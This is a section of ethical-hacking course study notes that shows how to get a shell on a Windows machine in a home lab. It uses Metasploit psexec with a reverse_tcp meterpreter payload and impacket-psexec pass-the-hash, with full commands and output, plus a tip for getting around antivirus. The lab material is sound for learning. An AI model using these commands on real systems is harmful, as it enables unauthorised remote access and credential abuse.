# VIII. Gaining Shell Access

Based on the previous attacks, some information was obtained that can be utilized to gain a shell on a machine.

This can be done through a variety of ways, such as:

- **Through Metasploit - with a password.** `use exploit/windows/smb/psexec`
    
    Make sure Kali and both Windows machines are on.
    
    On Kali start metasploit with `msfconsole`.
    
    Next, type the following command `use exploit/windows/smb/psexec`.
    
    Use the `options` command.
    
    The target machine is 64-bit, so change the payload using `set payload windows/x64/meterpreter/reverse_tcp`
    
    Give the target windows machine IP address with `set RHOSTS <IP>`,
    
    The SMB Domain with `set smbdomain <DOMAIN NAME>`,
    
    The SMB Username (use the local administrator credentials) with `set smbuser <USERNAME>`,
    
    The Password with `set smbpass <PASSWORD>`,
    
    ```bash
    msf6 > use exploit/windows/smb/psexec
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
    payload => windows/x64/meterpreter/reverse_tcp
    msf6 exploit(windows/smb/psexec) > set rhosts 10.0.2.11
    rhosts => 10.0.2.11
    msf6 exploit(windows/smb/psexec) > set smbdomain ONEPIECE.local
    smbdomain => ONEPIECE.local
    msf6 exploit(windows/smb/psexec) > set smbuser Franky
    smbuser => Franky
    msf6 exploit(windows/smb/psexec) > set smbpass Password1
    smbpass => Password1
    msf6 exploit(windows/smb/psexec) > options
    
    Module options (exploit/windows/smb/psexec):
    
       Name                  Current Setting  Required  Description
       ----                  ---------------  --------  -----------
       RHOSTS                10.0.2.11        yes       The target host(s), see https://docs.metasplo
                                                        it.com/docs/using-metasploit/basics/using-met
                                                        asploit.html
       RPORT                 445              yes       The SMB service port (TCP)
       SERVICE_DESCRIPTION                    no        Service description to be used on target for
                                                        pretty listing
       SERVICE_DISPLAY_NAME                   no        The service display name
       SERVICE_NAME                           no        The service name
       SMBDomain             ONEPIECE.local   no        The Windows domain to use for authentication
       SMBPass               Password1        no        The password for the specified username
       SMBSHARE                               no        The share to connect to, can be an admin shar
                                                        e (ADMIN$,C$,...) or a normal read/write fold
                                                        er share
       SMBUser               Franky           no        The username to authenticate as
    
    Payload options (windows/x64/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     10.0.2.4         yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic
    
    ```
    
    Finally run the exploit using the `run` command.
    
    We can set this session to the background using `background`, show all current sessions with `sessions` and go back to any available session using `session <ID>`.
    
    ```bash
    msf6 exploit(windows/smb/psexec) > run
    
    [*] Started reverse TCP handler on 10.0.2.4:4444 
    [*] 10.0.2.11:445 - Connecting to the server...
    [*] 10.0.2.11:445 - Authenticating to 10.0.2.11:445|ONEPIECE.local as user 'Franky'...
    [*] 10.0.2.11:445 - Selecting PowerShell target
    [*] 10.0.2.11:445 - Executing the payload...
    [+] 10.0.2.11:445 - Service start timed out, OK if running a command or non-service executable...
    [*] Sending stage (200774 bytes) to 10.0.2.11
    [*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.11:63341) at 2024-04-22 06:16:06 -0400
    
    meterpreter > background
    [*] Backgrounding session 1...
    msf6 exploit(windows/smb/psexec) > sessions
    
    Active sessions
    ===============
    
      Id  Name  Type                     Information                   Connection
      --  ----  ----                     -----------                   ----------
      1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ FRANKY  10.0.2.4:4444 -> 10.0.2.11:633
                                                                       41 (10.0.2.11)
    
    ```
    

- **Through Metasploit - with a hash.** `use exploit/windows/smb/psexec`
    
    The steps are the same as the one above with minor differences such as not requiring a SMB Domain  This can be achieved with `unset smbdomain`.
    
    And, the user needs to be changed to the local administrator with `set smbuser administrator`.
    
    Copy the administrator hash from the SMB relay attack and use it with `set smbpass <HASH>`.
    
    ```bash
    msf6 exploit(windows/smb/psexec) > unset smbdomain
    Unsetting smbdomain...
    [!] Variable "smbdomain" unset - but will use a default value still. If this is not desired, set it to a new value or attempt to clear it with set --clear smbdomain
    msf6 exploit(windows/smb/psexec) > set smbuser administrator
    smbuser => administrator
    msf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
    smbpass => aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
    ```
    
    Run the exploit.
    
    ```bash
    msf6 exploit(windows/smb/psexec) > run
    
    [*] Started reverse TCP handler on 10.0.2.4:4444 
    [*] 10.0.2.11:445 - Connecting to the server...
    [*] 10.0.2.11:445 - Authenticating to 10.0.2.11:445 as user 'administrator'...
    [*] 10.0.2.11:445 - Selecting PowerShell target
    [*] 10.0.2.11:445 - Executing the payload...
    [*] Sending stage (200774 bytes) to 10.0.2.11
    [+] 10.0.2.11:445 - Service start timed out, OK if running a command or non-service executable...
    [*] Meterpreter session 2 opened (10.0.2.4:4444 -> 10.0.2.11:61424) at 2024-04-22 06:23:07 -0400
    
    meterpreter > ls
    Listing: C:\Windows\system32
    ```
    

These methods tend to be pretty noisy and can easily be detected if used in a real-world environment. Hence we can use a tool like:

- **psexec - with password.** `psexec.py ONEPIECE.local/franky:'Password1'@10.0.2.11`
    
    Go to a new tab and use `impacket-psexec DOMAIN NAME/USERNAME:'PASSWORD'@IPADDRESS`
    
    And we have a shell.
    
    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ sudo impacket-psexec ONEPIECE.local/franky:'Password1'@10.0.2.11 
    [sudo] password for kali: 
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
    
    [*] Requesting shares on 10.0.2.11.....
    [*] Found writable share ADMIN$
    [*] Uploading file JOAVimib.exe
    [*] Opening SVCManager on 10.0.2.11.....
    [*] Creating service wUhC on 10.0.2.11.....
    [*] Starting service wUhC.....
    [!] Press help for extra shell commands
    Microsoft Windows [Version 10.0.19045.2006]
    (c) Microsoft Corporation. All rights reserved.
    
    C:\Windows\system32> net user
     
    User accounts for \\
    
    -------------------------------------------------------------------------------
    Administrator            DefaultAccount           Guest                    
    Suuuper                  WDAGUtilityAccount       
    
    ```
    
    NOTE: In a situation were there’s a password that cannot be passed as a string, simply omit it from the command and enter it in the prompt.
    

- **psexec - with a hash.** `psexec.py administrator@10.0.2.11 -hashes LM:NT`
    
    Copy the administrator hash from the SMB relay attack.
    
     ![shell_1](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/b07ee86c-88ce-4dc3-bc6d-9fcac43627fd)

    
    Use the following command `impacket-psexec USERNAME@IPADDRESS -hashes HASH`
    
    Boom a shell.
    
    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ sudo impacket-psexec administrator@10.0.2.11 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
    
    [*] Requesting shares on 10.0.2.11.....
    [*] Found writable share ADMIN$
    [*] Uploading file wTVCTmGn.exe
    [*] Opening SVCManager on 10.0.2.11.....
    [*] Creating service RHCb on 10.0.2.11.....
    [*] Starting service RHCb.....
    [!] Press help for extra shell commands
    Microsoft Windows [Version 10.0.19045.2006]
    (c) Microsoft Corporation. All rights reserved.
    
    C:\Windows\system32> net user
     
    User accounts for \\
    
    -------------------------------------------------------------------------------
    Administrator            DefaultAccount           Guest                    
    Suuuper                  WDAGUtilityAccount       
    ```
    
    NOTE: In a situation where psexec does not work or gets blocked by an antivirus. Use `wmicexec` or `smbexec` with the same arguments.
